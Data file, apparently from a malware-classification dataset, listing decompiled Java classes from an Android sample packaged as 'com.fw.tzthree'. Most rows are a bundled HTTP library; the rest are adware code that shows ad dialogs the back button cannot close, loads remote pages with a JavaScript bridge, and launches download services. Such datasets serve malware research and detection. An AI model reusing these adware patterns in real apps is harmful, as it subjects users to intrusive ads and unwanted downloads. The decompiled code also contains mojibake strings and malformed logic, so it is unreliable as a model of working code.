        }  catch (                IOException e) {                 }               }             }  catch (            ParserConfigurationException e2) {               e=e2;               Log.e(LOG_TAG,""getResponseData exception"",e);               AsyncHttpClient.silentCloseInputStream(content);               if (inputStreamReader != null) {                 try {                   inputStreamReader.close();                 }  catch (                IOException e3) {                 }               }               return null;             } catch (            SAXException e4) {               e=e4;               Log.e(LOG_TAG,""getResponseData exception"",e);               AsyncHttpClient.silentCloseInputStream(content);               if (inputStreamReader != null) {                 try {                   inputStreamReader.close();                 }  catch (                IOException e5) {                 }               }               return null;             }           }  catch (          ParserConfigurationException e6) {             e=e6;             inputStreamReader=null;           } catch (          SAXException e7) {             e=e7;             inputStreamReader=null;           } catch (          Throwable th) {             th=th;             inputStreamReader=null;             AsyncHttpClient.silentCloseInputStream(content);             if (inputStreamReader != null) {               try {                 inputStreamReader.close();               }  catch (              IOException e8) {               }             }             throw th;           }         }       }  catch (      Throwable th2) {         th=th2;       }     }     return null;   }   public abstract void onFailure(  int i,  Header[] headerArr,  T t);   @Override public void onFailure(  int i,  Header[] headerArr,  byte[] bArr,  Throwable th){     onSuccess(i,headerArr,(Header[])this.handler);   }   public abstract void onSuccess(  int i,  Header[] headerArr,  T t);   @Override public void onSuccess(  int i,  Header[] headerArr,  byte[] bArr){     onSuccess(i,headerArr,(Header[])this.handler);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\SerializableCookie.code","public class SerializableCookie implements Serializable {   private static final long serialVersionUID=6374381828722046732L;   private transient BasicClientCookie clientCookie;   private final transient Cookie cookie;   public SerializableCookie(  Cookie cookie){     this.cookie=cookie;   }   private void readObject(  ObjectInputStream objectInputStream){     this.clientCookie=new BasicClientCookie((String)objectInputStream.readObject(),(String)objectInputStream.readObject());     this.clientCookie.setComment((String)objectInputStream.readObject());     this.clientCookie.setDomain((String)objectInputStream.readObject());     this.clientCookie.setExpiryDate((Date)objectInputStream.readObject());     this.clientCookie.setPath((String)objectInputStream.readObject());     this.clientCookie.setVersion(objectInputStream.readInt());     this.clientCookie.setSecure(objectInputStream.readBoolean());   }   private void writeObject(  ObjectOutputStream objectOutputStream){     objectOutputStream.writeObject(this.cookie.getName());     objectOutputStream.writeObject(this.cookie.getValue());     objectOutputStream.writeObject(this.cookie.getComment());     objectOutputStream.writeObject(this.cookie.getDomain());     objectOutputStream.writeObject(this.cookie.getExpiryDate());     objectOutputStream.writeObject(this.cookie.getPath());     objectOutputStream.writeInt(this.cookie.getVersion());     objectOutputStream.writeBoolean(this.cookie.isSecure());   }   public Cookie getCookie(){     return this.clientCookie != null ? this.clientCookie : this.cookie;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\SimpleMultipartEntity.code","public class SimpleMultipartEntity implements HttpEntity {   private static final String LOG_TAG=""SimpleMultipartEntity"";   private final String boundary;   private final byte[] boundaryEnd;   private final byte[] boundaryLine;   private int bytesWritten;   private boolean isRepeatable;   private final ResponseHandlerInterface progressHandler;   private int totalSize;   private static final String STR_CR_LF=""\r\n"";   private static final byte[] CR_LF=STR_CR_LF.getBytes();   private static final byte[] TRANSFER_ENCODING_BINARY=""Content-Transfer-Encoding: binary\r\n"".getBytes();   private static final char[] MULTIPART_CHARS=""-_1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"".toCharArray();   private final List<FilePart> fileParts=new ArrayList();   private final ByteArrayOutputStream out=new ByteArrayOutputStream(); public class FilePart {     public File file;     public byte[] header;     public FilePart(    String str,    File file,    String str2){       this.header=createHeader(str,file.getName(),str2);       this.file=file;     }     private byte[] createHeader(    String str,    String str2,    String str3){       ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();       try {         byteArrayOutputStream.write(SimpleMultipartEntity.this.boundaryLine);         byteArrayOutputStream.write(SimpleMultipartEntity.this.createContentDisposition(str,str2));         byteArrayOutputStream.write(SimpleMultipartEntity.this.createContentType(str3));         byteArrayOutputStream.write(SimpleMultipartEntity.TRANSFER_ENCODING_BINARY);         byteArrayOutputStream.write(SimpleMultipartEntity.CR_LF);       }  catch (      IOException e) {         Log.e(SimpleMultipartEntity.LOG_TAG,""createHeader ByteArrayOutputStream exception"",e);       }       return byteArrayOutputStream.toByteArray();     }     public long getTotalLength(){       return this.file.length() + SimpleMultipartEntity.CR_LF.length + this.header.length;     }     public void writeTo(    OutputStream outputStream){       outputStream.write(this.header);       SimpleMultipartEntity.this.updateProgress(this.header.length);       FileInputStream fileInputStream=new FileInputStream(this.file);       byte[] bArr=new byte[4096];       while (true) {         int read=fileInputStream.read(bArr);         if (read == -1) {           outputStream.write(SimpleMultipartEntity.CR_LF);           SimpleMultipartEntity.this.updateProgress(SimpleMultipartEntity.CR_LF.length);           outputStream.flush();           AsyncHttpClient.silentCloseInputStream(fileInputStream);           return;         }         outputStream.write(bArr,0,read);         SimpleMultipartEntity.this.updateProgress(read);       }     }   }   public SimpleMultipartEntity(  ResponseHandlerInterface responseHandlerInterface){     StringBuilder sb=new StringBuilder();     Random random=new Random();     for (int i=0; i < 30; i++) {       sb.append(MULTIPART_CHARS[random.nextInt(MULTIPART_CHARS.length)]);     }     this.boundary=sb.toString();     this.boundaryLine=(""--"" + this.boundary + STR_CR_LF).getBytes();     this.boundaryEnd=(""--"" + this.boundary + ""--""+ STR_CR_LF).getBytes();     this.progressHandler=responseHandlerInterface;   }   private byte[] createContentDisposition(  String str){     return (""Content-Disposition: form-data; name=\"""" + str + ""\""""+ STR_CR_LF).getBytes();   }   public byte[] createContentDisposition(  String str,  String str2){     return (""Content-Disposition: form-data; name=\"""" + str + ""\""; filename=\""""+ str2+ ""\""""+ STR_CR_LF).getBytes();   }   public byte[] createContentType(  String str){     return (""Content-Type: "" + normalizeContentType(str) + STR_CR_LF).getBytes();   }   private String normalizeContentType(  String str){     return str == null ? RequestParams.APPLICATION_OCTET_STREAM : str;   }   public void updateProgress(  int i){     this.bytesWritten+=i;     this.progressHandler.sendProgressMessage(this.bytesWritten,this.totalSize);   }   public void addPart(  String str,  File file){     addPart(str,file,(String)null);   }   public void addPart(  String str,  File file,  String str2){     this.fileParts.add(new FilePart(str,file,normalizeContentType(str2)));   }   public void addPart(  String str,  String str2){     addPartWithCharset(str,str2,null);   }   public void addPart(  String str,  String str2,  InputStream inputStream,  String str3){     this.out.write(this.boundaryLine);     this.out.write(createContentDisposition(str,str2));     this.out.write(createContentType(str3));     this.out.write(TRANSFER_ENCODING_BINARY);     this.out.write(CR_LF);     byte[] bArr=new byte[4096];     while (true) {       int read=inputStream.read(bArr);       if (read == -1) {         this.out.write(CR_LF);         this.out.flush();         AsyncHttpClient.silentCloseOutputStream(this.out);         return;       }       this.out.write(bArr,0,read);     }   }   public void addPart(  String str,  String str2,  String str3){     try {       this.out.write(this.boundaryLine);       this.out.write(createContentDisposition(str));       this.out.write(createContentType(str3));       this.out.write(CR_LF);       this.out.write(str2.getBytes());       this.out.write(CR_LF);     }  catch (    IOException e) {       Log.e(LOG_TAG,""addPart ByteArrayOutputStream exception"",e);     }   }   public void addPartWithCharset(  String str,  String str2,  String str3){     if (str3 == null) {       str3=AsyncHttpResponseHandler.DEFAULT_CHARSET;     }     addPart(str,str2,""text/plain; charset="" + str3);   }   @Override public void consumeContent(){     if (isStreaming()) {       throw new UnsupportedOperationException(""Streaming entity does not implement #consumeContent()"");     }   }   @Override public InputStream getContent(){     throw new UnsupportedOperationException(""getContent() is not supported. Use writeTo() instead."");   }   @Override public Header getContentEncoding(){     return null;   }   @Override public long getContentLength(){     long size=this.out.size();     Iterator<FilePart> it=this.fileParts.iterator();     while (true) {       long j=size;       if (!it.hasNext()) {         return j + this.boundaryEnd.length;       }       long totalLength=it.next().getTotalLength();       if (totalLength < 0) {         return -1L;       }       size=j + totalLength;     }   }   @Override public Header getContentType(){     return new BasicHeader(""Content-Type"",""multipart/form-data; boundary="" + this.boundary);   }   @Override public boolean isChunked(){     return false;   }   @Override public boolean isRepeatable(){     return this.isRepeatable;   }   @Override public boolean isStreaming(){     return false;   }   public void setIsRepeatable(  boolean z){     this.isRepeatable=z;   }   @Override public void writeTo(  OutputStream outputStream){     this.bytesWritten=0;     this.totalSize=(int)getContentLength();     this.out.writeTo(outputStream);     updateProgress(this.out.size());     Iterator<FilePart> it=this.fileParts.iterator();     while (it.hasNext()) {       it.next().writeTo(outputStream);     }     outputStream.write(this.boundaryEnd);     updateProgress(this.boundaryEnd.length);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\StreamWrapper.code","public class StreamWrapper {   public final boolean autoClose;   public final String contentType;   public final InputStream inputStream;   public final String name;   public StreamWrapper(  InputStream inputStream,  String str,  String str2,  boolean z){     this.inputStream=inputStream;     this.name=str;     this.contentType=str2;     this.autoClose=z;   }   static StreamWrapper newInstance(  InputStream inputStream,  String str,  String str2,  boolean z){     if (str2 == null) {       str2=RequestParams.APPLICATION_OCTET_STREAM;     }     return new StreamWrapper(inputStream,str,str2,z);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\SyncHttpClient.code","public class SyncHttpClient extends AsyncHttpClient {   public SyncHttpClient(){     super(false,80,443);   }   public SyncHttpClient(  int i){     super(false,i,443);   }   public SyncHttpClient(  int i,  int i2){     super(false,i,i2);   }   public SyncHttpClient(  SchemeRegistry schemeRegistry){     super(schemeRegistry);   }   public SyncHttpClient(  boolean z,  int i,  int i2){     super(z,i,i2);   }   @Override protected RequestHandle sendRequest(  DefaultHttpClient defaultHttpClient,  HttpContext httpContext,  HttpUriRequest httpUriRequest,  String str,  ResponseHandlerInterface responseHandlerInterface,  Context context){     if (str != null) {       httpUriRequest.addHeader(""Content-Type"",str);     }     responseHandlerInterface.setUseSynchronousMode(true);     newAsyncHttpRequest(defaultHttpClient,httpContext,httpUriRequest,str,responseHandlerInterface,context).run();     return new RequestHandle(null);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\TextHttpResponseHandler.code","public abstract class TextHttpResponseHandler extends AsyncHttpResponseHandler {   private static final String LOG_TAG=""TextHttpResponseHandler"";   public TextHttpResponseHandler(){     this(AsyncHttpResponseHandler.DEFAULT_CHARSET);   }   public TextHttpResponseHandler(  String str){     setCharset(str);   }   public static String getResponseString(  byte[] bArr,  String str){     if (bArr == null) {       return null;     }     try {       return new String(bArr,str);     }  catch (    UnsupportedEncodingException e) {       Log.e(LOG_TAG,""Encoding response into string failed"",e);       return null;     }   }   public abstract void onFailure(  int i,  Header[] headerArr,  String str,  Throwable th);   @Override public void onFailure(  int i,  Header[] headerArr,  byte[] bArr,  Throwable th){     onFailure(i,headerArr,getResponseString(bArr,getCharset()),th);   }   public abstract void onSuccess(  int i,  Header[] headerArr,  String str);   @Override public void onSuccess(  int i,  Header[] headerArr,  byte[] bArr){     onSuccess(i,headerArr,getResponseString(bArr,getCharset()));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\a.code","public class a extends Dialog implements g {   private AdView a;   public a(  Context context,  int i){     super(context,R.style.Theme.Translucent.NoTitleBar);   }   @Override public void a(){     dismiss();   }   public void a(  Context context,  List<TableplaqueAdInfo> list){     if (this.a == null) {       this.a=new AdView(context,list,this);       this.a.setBackgroundColor(Color.argb(60,0,0,0));     }     setContentView(this.a);     show();   }   @Override public void onBackPressed(){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\aa.code","public class aa implements Runnable {   final Context a;   final AdInfo b;   final y c;   public aa(  y yVar,  Context context,  AdInfo adInfo){     this.c=yVar;     this.a=context;     this.b=adInfo;   }   @Override public void run(){     this.c.postActionRequest(this.a,this.b,7);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\ab.code","class ab implements Runnable {   final Context a;   final Handler b;   final CustomBusiness c;   public ab(  CustomBusiness customBusiness,  Context context,  Handler handler){     this.c=customBusiness;     this.a=context;     this.b=handler;   }   @Override public void run(){     CustomBusiness.getInstence().requestAdList(this.a,this.b,null);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\ac.code","public interface ac {   void a(  BusinessDataContext<FullScreenAdInfo> businessDataContext);   void a(  BusinessDataContext<FullScreenAdInfo> businessDataContext,  List<FullScreenAdInfo> list); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\ad.code","public class ad implements Runnable {   final Context a;   final Handler b;   final int c;   final FullScreenBusiness d;   public ad(  FullScreenBusiness fullScreenBusiness,  Context context,  Handler handler,  int i){     this.d=fullScreenBusiness;     this.a=context;     this.b=handler;     this.c=i;   }   @Override public void run(){     this.d.a(this.a,this.b,null,new ae(this),2);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\AdView.code","public class AdView extends RelativeLayout {   List<TableplaqueAdInfo> a;   int b;   int c;   private int d;   private int e;   private Context f;   private g g;   private AutoScrollViewPager h;   private float i;   public AdView(  Context context,  List<TableplaqueAdInfo> list,  g gVar){     super(context);     this.c=5000;     this.a=list;     this.g=gVar;     b(context);     a(context);   }   public RelativeLayout a(  Context context,  AutoScrollViewPager autoScrollViewPager,  RelativeLayout.LayoutParams layoutParams,  RelativeLayout relativeLayout,  TableplaqueAdInfo tableplaqueAdInfo){     this.f=context;     RelativeLayout relativeLayout2=new RelativeLayout(context);     relativeLayout2.setLayoutParams(layoutParams);     relativeLayout2.setBackgroundColor(Color.parseColor(""#aaaaaaaa""));     Button button=new Button(context);     button.setText(""ç«‹å�³ä¸‹è½½"");     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(com.fw.tzthree.d.n.a(context,100.0f),com.fw.tzthree.d.n.a(context,40.0f));     layoutParams2.addRule(13);     button.setLayoutParams(layoutParams2);     button.setBackgroundColor(-256);     button.setTextSize(2,12.0f);     button.setBackgroundDrawable(com.fw.tzthree.d.ac.a(com.fw.tzthree.d.ac.a(Color.parseColor(""#224d1f""),15,false),com.fw.tzthree.d.ac.a(Color.parseColor(""#53bd4c""),15,false)));     button.setTextSize(2,18.0f);     button.setTextColor(com.fw.tzthree.d.ac.a(-1,-7829368));     button.setOnClickListener(new e(this,autoScrollViewPager,relativeLayout,relativeLayout2,tableplaqueAdInfo));     relativeLayout2.addView(button);     relativeLayout2.setOnClickListener(new f(this,autoScrollViewPager,relativeLayout,relativeLayout2,tableplaqueAdInfo));     return relativeLayout2;   }   private void a(  Context context){     this.f=context;     int i=(int)((this.d < this.e ? this.d : this.e) * 0.85d);     int i2=(i * 5) / 7;     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setId(141972486);     linearLayout.setBackgroundColor(0);     addView(linearLayout,new RelativeLayout.LayoutParams(-1,-1));     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(i,i2);     layoutParams.addRule(13);     MyRelativeLayout myRelativeLayout=new MyRelativeLayout(context);     myRelativeLayout.setId(141972487);     myRelativeLayout.setBackgroundColor(0);     addView(myRelativeLayout,layoutParams);     this.h=new AutoScrollViewPager(context);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(i,i2);     layoutParams2.addRule(13);     this.h.setLayoutParams(layoutParams2);     myRelativeLayout.setAutoScrollViewPager(this.h);     ArrayList arrayList=new ArrayList();     String resourcesAddr=InterstitialBusiness.a().getSetting(context,3).getResourcesAddr();     ImageView imageView=new ImageView(context);     Bitmap a=com.fw.tzthree.d.n.a(com.fw.tzthree.d.a.a(context,""dm_cover_close.png""));     int a2=com.fw.tzthree.d.n.a(context,25.0f);     imageView.setImageBitmap(com.fw.tzthree.d.n.a(a,a2,a2));     imageView.setVisibility(4);     int i3=0;     while (true) {       int i4=i3;       if (i4 >= this.a.size()) {         break;       }       TableplaqueAdInfo tableplaqueAdInfo=this.a.get(i4);       if (4 == tableplaqueAdInfo.getKind().intValue()) {         ProgressWebView progressWebView=new ProgressWebView(context);         progressWebView.addJavascriptInterface(new JsInterface(context,tableplaqueAdInfo,InterstitialBusiness.a()),com.fw.tzthree.b.a.O);         progressWebView.loadUrl(tableplaqueAdInfo.getUrl() + ""?w="" + (i / this.i)+ ""&h=""+ (i2 / this.i));         arrayList.add(progressWebView);       }  else {         SmartImageView smartImageView=new SmartImageView(context);         smartImageView.setAdjustViewBounds(true);         smartImageView.setScaleType(ImageView.ScaleType.FIT_XY);         smartImageView.setOnClickListener(new b(this,smartImageView,tableplaqueAdInfo,layoutParams2,myRelativeLayout,context));         arrayList.add(smartImageView);         smartImageView.setImageUrl(resourcesAddr + tableplaqueAdInfo.getTablePlaqueImg(),new c(this,imageView));       }       i3=i4 + 1;     }     this.h.setAdapter(new com.fw.tzthree.a.a(arrayList));     this.h.setOnPageChangeListener(new h(this,this.a,linearLayout,context,arrayList));     this.b=context.getSharedPreferences(com.fw.tzthree.b.a.h,0).getInt(com.fw.tzthree.b.a.j,100);     if (this.b + 1 == this.a.size()) {       this.b=0;     }  else     if (this.b == 100) {       this.b=0;     }  else {       this.b++;     }     this.h.setCurrentItem(this.b,true);     TableplaqueAdInfo tableplaqueAdInfo2=this.a.get(0);     if (tableplaqueAdInfo2 != null && tableplaqueAdInfo2.getShowTime() != null) {       this.c=tableplaqueAdInfo2.getShowTime().intValue() * 1000;     }     this.h.setId(141972480);     myRelativeLayout.addView(this.h);     RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(-2,-2);     layoutParams3.addRule(1,141972487);     layoutParams3.addRule(2,141972487);     layoutParams3.leftMargin=-com.fw.tzthree.d.n.a(context,20.0f);     layoutParams3.bottomMargin=-com.fw.tzthree.d.n.a(context,20.0f);     imageView.setLayoutParams(layoutParams3);     imageView.setOnClickListener(new d(this));     addView(imageView);   }   public void a(  Context context,  TableplaqueAdInfo tableplaqueAdInfo){     Intent intent=new Intent(context,(Class<?>)FwDservice.class);     intent.putExtra(com.fw.tzthree.b.a.aX,tableplaqueAdInfo);     intent.putExtra(com.fw.tzthree.b.a.ba,3);     intent.putExtra(""033C9AA179013A52D68F761D575E5A4A"",1);     context.startService(intent);   }   private void b(  Context context){     DisplayMetrics displayMetrics=new DisplayMetrics();     ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);     this.i=displayMetrics.density;     this.d=displayMetrics.widthPixels;     this.e=displayMetrics.heightPixels;     if (this.d <= 320) {       this.d=(int)Math.ceil(this.d * this.i);       this.e=(int)Math.ceil(this.e * this.i);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\ae.code","class ae implements ac {   final ad a;   public ae(  ad adVar){     this.a=adVar;   }   @Override public void a(  BusinessDataContext<FullScreenAdInfo> businessDataContext){   }   @Override public void a(  BusinessDataContext<FullScreenAdInfo> businessDataContext,  List<FullScreenAdInfo> list){     FullScreenAdInfo fullScreenAdInfo=list.get(0);     Setting setting=this.a.d.getSetting(this.a.a,6);     if (setting == null || TextUtils.isEmpty(setting.getResourcesAddr())) {       return;     }     com.fw.tzthree.d.n.a(this.a.a,setting.getResourcesAddr() + fullScreenAdInfo.getFullScreenImg(),new af(this,fullScreenAdInfo,setting));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\af.code","class af implements com.fw.tzthree.d.q {   final FullScreenAdInfo a;   final Setting b;   final ae c;   public af(  ae aeVar,  FullScreenAdInfo fullScreenAdInfo,  Setting setting){     this.c=aeVar;     this.a=fullScreenAdInfo;     this.b=setting;   }   @Override public void a(  Bitmap bitmap){     if (bitmap != null) {       Intent intent=new Intent(this.c.a.a,(Class<?>)FwSActivity.class);       Bundle bundle=new Bundle();       bundle.putSerializable(com.fw.tzthree.b.a.bC,this.a);       bundle.putInt(com.fw.tzthree.b.a.bB,this.c.a.c);       bundle.putString(com.fw.tzthree.b.a.bA,this.b.getResourcesAddr() + this.a.getFullScreenImg());       intent.putExtras(bundle);       this.c.a.a.startActivity(intent);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\ag.code","public class ag implements com.fw.tzthree.d.q {   final FullScreenView a;   public ag(  FullScreenView fullScreenView){     this.a=fullScreenView;   }   @Override public void a(  Bitmap bitmap){     this.a.a(bitmap);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\ah.code","public class ah implements DialogInterface.OnClickListener {   final FullScreenView a;   public ah(  FullScreenView fullScreenView){     this.a=fullScreenView;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     this.a.j=false;     dialogInterface.cancel();     this.a.e();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\ai.code","public class ai implements DialogInterface.OnClickListener {   final FullScreenView a;   public ai(  FullScreenView fullScreenView){     this.a=fullScreenView;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     this.a.j=false;     dialogInterface.cancel();     this.a.f();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\aj.code","public class aj implements DialogInterface.OnClickListener {   final FullScreenView a;   public aj(  FullScreenView fullScreenView){     this.a=fullScreenView;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     this.a.j=false;     dialogInterface.cancel();     this.a.e();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\ak.code","public class ak implements Runnable {   final String a;   final FullScreenView b;   public ak(  FullScreenView fullScreenView,  String str){     this.b=fullScreenView;     this.a=str;   }   @Override public void run(){     this.b.o=true;     this.b.d(""æ²¡æœ‰åˆ°æœ€çŸ­æ—¶é—´åœ¨å»¶è¿ŸNæ¯«ç§’"");   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\al.code","public class al implements Runnable {   final FullScreenView a;   public al(  FullScreenView fullScreenView){     this.a=fullScreenView;   }   @Override public void run(){     this.a.e(""è¿˜æ²¡æœ‰åˆ°æœ€çŸ­æ—¶é—´åœ¨å�‘ä¸ªå»¶è¿ŸNæ¯«ç§’"");   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\am.code","public class am extends SmartImageTask.OnCompleteHandler {   final FullScreenView a;   public am(  FullScreenView fullScreenView){     this.a=fullScreenView;   }   @Override public void onComplete(  Bitmap bitmap){     boolean z;     z=this.a.o;     if (z) {       return;     }     if (bitmap == null) {       this.a.d(""å¹¿å‘Šå›¾ç‰‡æ˜¯null"");     }  else {       this.a.a(bitmap);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\an.code","public class an implements Runnable {   final Handler a;   final FullScreenView b;   public an(  FullScreenView fullScreenView,  Handler handler){     this.b=fullScreenView;     this.a=handler;   }   @Override public void run(){     FullScreenBusiness.a().a(this.b.getContext(),this.a,null,new ao(this),1);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\ao.code","class ao implements ac {   final an a;   public ao(  an anVar){     this.a=anVar;   }   @Override public void a(  BusinessDataContext<FullScreenAdInfo> businessDataContext){     this.a.b.p=true;     this.a.b.d(""æ•°æ�®è¿”å›žbusinessData == null"");   }   @Override public void a(  BusinessDataContext<FullScreenAdInfo> businessDataContext,  List<FullScreenAdInfo> list){     boolean z;     FullScreenAdInfo fullScreenAdInfo;     Setting setting;     FullScreenAdInfo fullScreenAdInfo2;     SmartImageTask smartImageTask;     SmartImageTask.OnCompleteHandler onCompleteHandler;     SmartImageTask smartImageTask2;     z=this.a.b.o;     if (z) {       return;     }     this.a.b.p=false;     this.a.b.e=list.get(0);     FullScreenView fullScreenView=this.a.b;     fullScreenAdInfo=this.a.b.e;     fullScreenView.i=fullScreenAdInfo.getShowTime().intValue();     this.a.b.g=FullScreenBusiness.a().getSetting(this.a.b.getContext(),6);     FullScreenView fullScreenView2=this.a.b;     Context context=this.a.b.getContext();     StringBuilder sb=new StringBuilder();     setting=this.a.b.g;     StringBuilder append=sb.append(setting.getResourcesAddr());     fullScreenAdInfo2=this.a.b.e;     fullScreenView2.s=new SmartImageTask(context,new WebImage(append.append(fullScreenAdInfo2.getFullScreenImg()).toString()));     smartImageTask=this.a.b.s;     onCompleteHandler=this.a.b.f;     smartImageTask.setOnCompleteHandler(onCompleteHandler);     smartImageTask2=this.a.b.s;     new Thread(smartImageTask2).start();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\ap.code","public class ap implements Runnable {   final FullScreenView a;   public ap(  FullScreenView fullScreenView){     this.a=fullScreenView;   }   @Override public void run(){     boolean z;     SmartImageView smartImageView;     SmartImageView smartImageView2;     boolean z2;     z=this.a.p;     if (z) {       return;     }     smartImageView=this.a.b;     if (smartImageView != null) {       smartImageView2=this.a.b;       if (smartImageView2.getDrawable() == null) {         z2=this.a.o;         if (z2) {           return;         }         this.a.o=true;         this.a.d(""åˆ°äº†è®¾å®šçš„è¯·æ±‚å¹¿å‘Šè¶…æ—¶æ—¶é—´"");       }     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\AppWallBusiness.code","public class AppWallBusiness extends y<AppWallAdInfo> {   private static AppWallBusiness a;   public static AppWallBusiness a(){     if (a == null) {       a=new AppWallBusiness();     }     return a;   }   public List<AppWallAdInfo> a(  Context context,  int i){     AdNode adNode=new AdNode();     adNode.setAdType(5);     adNode.setCategory(0);     RootNode rootNode=new RootNode();     rootNode.setAd(adNode);     BusinessDataContext businessDataContext=new BusinessDataContext();     businessDataContext.setRequestData(rootNode);     businessDataContext.setUrl(com.fw.tzthree.b.a.Y);     businessDataContext.setAdType(getAdType());     businessDataContext.setContext(context);     businessDataContext.setCount(i);     businessDataContext.setDbHelper(new com.fw.tzthree.db.a());     return new com.fw.tzthree.c.a().a(businessDataContext);   }   public List<AppWallAdInfo> a(  Context context,  boolean z,  int i){     AdNode adNode=new AdNode();     adNode.setAdType(Integer.valueOf(getAdType()));     if (z) {       adNode.setCategory(1);     }  else {       adNode.setCategory(0);     }     adNode.setAdId(Integer.valueOf(i));     RootNode rootNode=new RootNode();     rootNode.setAd(adNode);     BusinessDataContext businessDataContext=new BusinessDataContext();     businessDataContext.setRequestData(rootNode);     businessDataContext.setContext(context);     businessDataContext.setUrl(com.fw.tzthree.b.a.Y);     businessDataContext.setAdType(5);     businessDataContext.setCount(0);     businessDataContext.setDbHelper(new com.fw.tzthree.db.a());     return new com.fw.tzthree.c.a().a(businessDataContext);   }   @Override protected void a(  com.fw.tzthree.d.f fVar){     fVar.d(com.fw.tzthree.b.a.q);     fVar.d(com.fw.tzthree.b.a.p);   }   @Override void a(  BusinessDataContext<AppWallAdInfo> businessDataContext){   }   @Override void a(  BusinessDataContext<AppWallAdInfo> businessDataContext,  List<AppWallAdInfo> list){   }   @Override public com.fw.tzthree.c.d addFilterPipelineNode(  com.fw.tzthree.c.d dVar,  BusinessDataContext businessDataContext){     return 1 == businessDataContext.getRequestData().getAd().getCategory().intValue() ? dVar.a(new com.fw.tzthree.c.a.s()) : 2 == businessDataContext.getRequestData().getAd().getCategory().intValue() ? dVar.a(new com.fw.tzthree.c.a.f()) : dVar.a(new com.fw.tzthree.c.a.d());   }   @Override public int getAdType(){     return 5;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\aq.code","public class aq implements Runnable {   final FullScreenView a;   public aq(  FullScreenView fullScreenView){     this.a=fullScreenView;   }   @Override public void run(){     TextView textView;     TextView textView2;     textView=this.a.c;     if (textView != null) {       FullScreenView fullScreenView=this.a;       textView2=this.a.c;       fullScreenView.addView(textView2);     }   } } "
